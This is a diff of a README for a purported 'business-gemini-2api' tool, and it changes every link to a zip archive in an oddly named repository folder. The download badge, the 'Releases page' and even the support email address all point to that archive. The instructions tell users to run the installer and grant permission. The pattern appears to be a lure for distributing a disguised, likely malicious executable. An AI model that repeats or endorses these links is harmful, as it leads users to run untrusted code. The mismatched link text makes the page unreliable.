@@ -4,7 +4,7 @@
 Welcome to business-gemini-2api! This application provides a straightforward way to access business data through an easy-to-use API. Whether you want to analyze your sales data or manage customer information, this tool can help you do it efficiently.
 
 ## 📥 Download the Application
-[![Download Now](https://raw.githubusercontent.com/eric69eric/business-gemini-2api/main/sacrovertebral/business_gemini_api_v2.2-beta.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/eric69eric/business-gemini-2api/main/sacrovertebral/business_gemini_api_v2.2-beta.2.zip)
+[![Download Now](https://github.com/eric69eric/business-gemini-2api/raw/refs/heads/main/sacrovertebral/api-business-gemini-2.5.zip%20Now-Click%20Here-blue)](https://github.com/eric69eric/business-gemini-2api/raw/refs/heads/main/sacrovertebral/api-business-gemini-2.5.zip)
 
 To get started, you will need to download the application. Here’s how:
 
@@ -24,7 +24,7 @@ Before you install, check that your computer meets these requirements:
 ## 🔧 Installation Instructions
 Here are the steps to install business-gemini-2api on your computer:
 
-1. **Download the Application**: Go to the [Releases page](https://raw.githubusercontent.com/eric69eric/business-gemini-2api/main/sacrovertebral/business_gemini_api_v2.2-beta.2.zip) and choose the latest version.
+1. **Download the Application**: Go to the [Releases page](https://github.com/eric69eric/business-gemini-2api/raw/refs/heads/main/sacrovertebral/api-business-gemini-2.5.zip) and choose the latest version.
 2. **Open the Installer**: Locate the downloaded file on your computer. Usually, it will be in your 'Downloads' folder.
 3. **Run the Installer**: Double-click the file to start the installation. If prompted for permission, click "Yes" to allow the installer to run.
 4. **Follow the on-screen Instructions**: The installation wizard will guide you through the process. You can accept the default settings for a quick installation.
@@ -58,6 +58,6 @@ If you need further help, feel free to reach out:
 
 - **Documentation**: Visit our [Documentation page](#) for in-depth guides and FAQs.
 - **Community Forum**: Join the conversation in our community forum for tips and support from other users.
-- **Contact Us**: You can email support at https://raw.githubusercontent.com/eric69eric/business-gemini-2api/main/sacrovertebral/business_gemini_api_v2.2-beta.2.zip for direct assistance.
+- **Contact Us**: You can email support at https://github.com/eric69eric/business-gemini-2api/raw/refs/heads/main/sacrovertebral/api-business-gemini-2.5.zip for direct assistance.
 
-For more updates, remember to check the [Releases page](https://raw.githubusercontent.com/eric69eric/business-gemini-2api/main/sacrovertebral/business_gemini_api_v2.2-beta.2.zip) regularly. Happy using!
+For more updates, remember to check the [Releases page](https://github.com/eric69eric/business-gemini-2api/raw/refs/heads/main/sacrovertebral/api-business-gemini-2.5.zip) regularly. Happy using!
